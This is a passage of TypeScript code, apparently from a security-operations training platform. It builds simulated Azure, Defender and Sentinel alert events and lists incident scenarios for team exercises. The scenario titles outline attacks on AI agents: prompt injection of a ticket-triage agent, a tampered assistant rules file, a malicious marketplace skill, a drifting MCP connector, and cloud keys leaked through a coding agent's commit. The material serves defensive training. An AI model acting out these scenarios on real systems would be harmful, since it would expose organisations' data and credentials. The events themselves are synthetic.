    azureOpenAiRequest({ ...bot, id: "ai4cs08", ts: "2026-10-29T10:21:18.000Z", callerIp: "10.10.20.70", status: 429, durationMs: 40, requestLength: 2010, responseLength: 310, severity: "low", mitre: "T1496.004", tactic: "Impact",
      description: "Azure OpenAI RequestResponse log: the OCR app's own request got HTTP 429 from gpt-4o-ocr." }),
    defenderAiAlert({
      ...bot, id: "ai4cs09", ts: "2026-10-29T10:26:40.000Z", startTs: "2026-10-29T10:07:02.000Z", alert: "suspiciousIp", clientIp: remote, geo, asOrg: "hosting provider",
      alertDescription: "An IP address identified by Microsoft Threat Intelligence as having a high probability of being a threat accessed the Azure AI resource aoai-dev-weu.",
      severity: "high", mitre: "T1078.004", tactic: "Initial Access",
      description: `Defender for Cloud raised Access from suspicious IP on ${AOAI.account} for ${remote}, deployment gpt-4o-ocr.`,
    }),
    sentinel({
      id: "ai4cs10", ts: "2026-10-29T10:33:12.000Z", host: DEV.host, srcIp: remote, user: DEV.user, severity: "high", eventType: "cloud_api_call", mitre: "T1078.004", tactic: "Initial Access",
      alertName: "AI resource key used from a new network shortly after a push to a public repository",
      detail: "A public repository push from a developer workstation, followed within minutes by key-authenticated calls from a hosting network.",
      startTime: "2026-10-29T10:02:02.000Z", endTime: "2026-10-29T10:26:40.000Z",
      extendedProperties: { Repository: publicRepo, Workstation: DEV.host, "Caller IP": remote, Deployment: "gpt-4o-ocr" },
      description: `Microsoft Sentinel joined the push to ${publicRepo} to the key-authenticated calls from ${remote}.`,
    }),
  );
  return withIncident(events, "inc:ai4cs:azure");
}

const AWS_SHOPS = ["rocketstack", "globallogis", "quantumbank"];
const AZURE_SHOPS = ["nexacorp", "medcore"];
const EVERY = ["nexacorp", "medcore", "globallogis", "quantumbank", "rocketstack"];

const STORIES: AiStoryDef[] = [
  { id: "ai-agent-skill-host-cloud-aws", title: "Coding Agent Skill from a Public Marketplace, Followed by AWS Key Use from a Hosting Provider", complexity: "advanced", companies: AWS_SHOPS, events: buildAgentSkill("aws") },
  { id: "ai-agent-skill-host-cloud-azure", title: "Coding Agent Skill from a Public Marketplace, Followed by Azure Token Use from a Hosting Provider", complexity: "advanced", companies: AZURE_SHOPS, events: buildAgentSkill("azure") },
  { id: "ai-hub-model-load-workstation", title: "Public Hub Model Loaded in a Notebook, Followed by Kernel Shell Activity", complexity: "core", companies: EVERY, events: buildHubModelLoad() },
  { id: "ai-ticket-triage-agent-injection", title: "AI Ticket Triage Worker Reads Beyond the Ticket and Reaches an External Domain", complexity: "core", companies: EVERY, events: buildTicketAgentInjection() },
  { id: "ai-mcp-server-update-drift", title: "Approved MCP Mail Connector Updates and Gains a New Mail Recipient", complexity: "core", companies: ["nexacorp", "medcore", "globallogis"], events: buildMcpUpdateDrift("mail") },
  { id: "ai-mcp-server-update-drift-api", title: "Approved MCP Mail Connector Updates and Starts Calling a New Domain", complexity: "core", companies: ["rocketstack", "quantumbank"], events: buildMcpUpdateDrift("https") },
  { id: "ai-exposed-inference-endpoint", title: "AI Inference Port on an Internal Server Reached from the Internet", complexity: "foundation", companies: EVERY, events: buildExposedInference() },
  { id: "ai-exposed-vector-store", title: "Pilot Vector Store Server Sends Gigabytes to a Public Address", complexity: "foundation", companies: EVERY, events: buildExposedVectorStore() },
  { id: "ai-agent-rules-file-tamper", title: "Assistant Rules File Grows After a Pull, Then a Build Reaches a New Domain", complexity: "core", companies: EVERY, events: buildRulesFileTamper() },
  { id: "ai-assistant-commit-key-leak-aws", title: "Coding Agent Pushes to a Public Repository, Then an AWS Key Is Used from Outside", complexity: "advanced", companies: AWS_SHOPS, events: buildCommitKeyLeak("aws") },
  { id: "ai-assistant-commit-key-leak-azure", title: "Coding Agent Pushes to a Public Repository, Then an Azure AI Key Is Used from Outside", complexity: "advanced", companies: AZURE_SHOPS, events: buildCommitKeyLeak("azure") },
];

/** Team Training only: these chains stay out of the single-player dashboard. */
export const AI_WAVE4_A_STORIES: AiStoryDef[] = STORIES.map(s => ({ ...s, teamOnly: true }));
